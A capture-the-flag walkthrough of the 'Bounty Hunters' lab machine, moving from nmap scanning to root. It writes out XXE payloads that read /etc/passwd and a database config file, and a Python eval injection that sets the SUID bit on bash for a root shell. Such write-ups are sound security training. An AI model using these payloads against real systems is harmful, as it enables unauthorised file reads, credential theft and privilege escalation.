# NMAP

```sh
PORT      STATE  SERVICE REASON       VERSION
22/tcp    open   ssh     syn-ack      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLosZOXFZWvSPhPmfUE7v+PjfXGErY0KCPmAWrTUkyyFWRFO3gwHQMQqQUIcuZHmH20xMb+mNC6xnX2TRmsyaufPXLmib9Wn0BtEYbVDlu2mOdxWfr+LIO8yvB+kg2Uqg+QHJf7SfTvdO606eBjF0uhTQ95wnJddm7WWVJlJMng7+/1NuLAAzfc0ei14XtyS1u6gDvCzXPR5xus8vfJNSp4n4B5m4GUPqI7odyXG2jK89STkoI5MhDOtzbrQydR0ZUg2PRd5TplgpmapDzMBYCIxH6BwYXFgSU3u3dSxPJnIrbizFVNIbc9ezkF39K+xJPbc9CTom8N59eiNubf63iDOck9yMH+YGk8HQof8ovp9FAT7ao5dfeb8gH9q9mRnuMOOQ9SxYwIxdtgg6mIYh4PRqHaSD5FuTZmsFzPfdnvmurDWDqdjPZ6/CsWAkrzENv45b0F04DFiKYNLwk8xaXLum66w61jz4Lwpko58Hh+m0i4bs25wTH1VDMkguJ1js=
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlGEKJHQ/zTuLAvcemSaOeKfnvOC4s1Qou1E0o9Z0gWONGE1cVvgk1VxryZn7A0L1htGGQqmFe50002LfPQfmY=
|   256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJeoMhM6lgQjk6hBf+Lw/sWR4b1h8AEiDv+HAbTNk4J3
80/tcp    open   http    syn-ack      Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA

```
Here  we find only two ports open:
# 22
Let's check which auth methods are allowed on this machine:
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
```

#80
On port 80 we find the webserver running:

![](80.png)

If we click on portal we get the following message:

`Portal under development. Go here to test the bounty tracker.`


We see a beta page which might mean the page is not fully tested and therefore can contain some security vulnerabilities.

![](submit.png)


If we submit the form and capture it with burp we can see encoded data.

![](capture.png)

In the pagesource we see a link to http://bountyhunter.htb/resources/bountylog.js.
And the the bountySubmit() function is called.




```js
function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}

```

We can see that an xml data is created and stored in the data variable. The xml is base64 encoded witht hte btoa function:


→ The btoa() method creates a  Base64-encoded ASCII string from a binary string (i.e., a  string in which each character in the string is treated as a byte  of binary data). https://developer.mozilla.org/en-US/docs/Web/API/btoa

If we decode the data in Burp we can reverse this and see the original data:

![](decode.png)


If we send the data to the server the info we sent is reflected on the page:

![](info.png)

# XXE File Read.
On the basis of the information we gathered we can create a payload to read the /etc/passwd file:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE bugreport [
<!ENTITY title SYSTEM "file:///etc/passwd">
]>
		<bugreport>
		<title>&title;</title>
		<cwe>611</cwe>
		<cvss>7.5</cvss>
		<reward>15000000</reward>
		</bugreport>
```

We can encode the payload with base64 and url in burpsuite!

![](passwd.png)



Boom! We have some users.


We can read the file db.php earlier found during enumeration

![](fuff.png)

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE bugreport [
<!ENTITY title SYSTEM "php://filter/convert.base64-encode/resource=db.php">
]>
		<bugreport>
		<title>&title;</title>
		<cwe>611</cwe>
		<cvss>7.5</cvss>
		<reward>15000000</reward>
		</bugreport>
```

If we convert this payload to base64 and url-encode it we can sent it to the server.
The server will return the contents of db.php in base64 format. we can simply decode it in burp.


![](db.png)

# SSH login

Now we have a username and a password. We can try to login with these to ssh:

![](user.png)

# Privesc

In the home directory we see file called contract.txt:

![](contract.png)

When we type ‘sudo -l’ we can see that we can the we can run /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py as root without a password


![](sudol.png)

The contents of the file are:

![](tickval.png)

One thing we notice immediately is the eval function: validationNumber = eval(x.replace("**", ""))


> Python’s eval() allows you to evaluate arbitrary Python expressions from a string-based or compiled-code-based input. This function can be handy when you’re trying to dynamically evaluate Python expressions from any input that comes as a string or a compiled code object.

But to get to that function we need to go through some checks:

```python
     4  def load_file(loc):
     5      if loc.endswith(".md"):
     6          return open(loc, 'r')
     7      else:
     8          print("Wrong file type.")
     9          exit()

```



The file ticket that needs to be read has to have a ‘.md’ extension.
We can test this by creating a .txt and .md file and pass it to the program:

![](ext.png)

    11  def evaluate(ticketFile):
    12      #Evaluates a ticket to check for ireggularities.
    13      code_line = None
    14      for i,x in enumerate(ticketFile.readlines()):
    15          if i == 0:
    16              if not x.startswith("# Skytrain Inc"):
    17                  return False


Next: The first line has to start with ‘# Skytrain Inc’ and the second line with ‘## Ticket to ’

```python
    14      for i,x in enumerate(ticketFile.readlines()):
    15          if i == 0:
    16              if not x.startswith("# Skytrain Inc"):
    17                  return False
    18              continue
    19          if i == 1:
    20              if not x.startswith("## Ticket to "):
    21                  return False
    22              print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
    23              continue

```

Again we can check this by adding these two lines to the .md file:
```md
# Skytrain Inc
## Ticket to ransomware 
```

![](printran.png)


```python
    25          if x.startswith("__Ticket Code:__"):
    26              code_line = i+1
    27              continue
```

The next line (3rd) has to start ‘__Ticket Code:__’ and has to start with ‘**’:

```python
    29          if code_line and i == code_line:
    30              if not x.startswith("**"):
    31                  return False
```

Our .md file now looks like this:

```md
# Skytrain Inc
## Ticket to ransomware 
__Ticket Code:__
**
```

Now the last part:

```python
    32              ticketCode = x.replace("**", "").split("+")[0]
    33              if int(ticketCode) % 7 == 4:
    34                  validationNumber = eval(x.replace("**", ""))
    35                  if validationNumber > 100:
    36                      return True
```

In line 32 ‘**’ gets replaced by nothing. and the string gets splitted at “+". Only the first part before the “+” gets stored in the ticketCode variable.

The ticketCode must be a value that the remainder of modulo 7 equals 4. To get a complete valid ticket the ticketCode needs to be above 100.

our test.md valid ticket looks like this:
```md
# Skytrain Inc
## Ticket to ransomware
__Ticket Code:__
**144
```

![](valid.png)

in line 32 the complete line (string) in the test.md ticket gets evaluated. To exploit this we can add our python code behind the 144 seperated by a ‘+’:

```
# Skytrain Inc
## Ticket to ransomware
__Ticket Code:__
**144+__import__('os').system('chmod +s /usr/bin/bash')
```
With this payload we set the SUID bit on /usr/bin/bash. Now can just type ‘bash -p’ to get a root shell as mentioned here: https://gtfobins.github.io/gtfobins/bash/#suid

![](root.png)



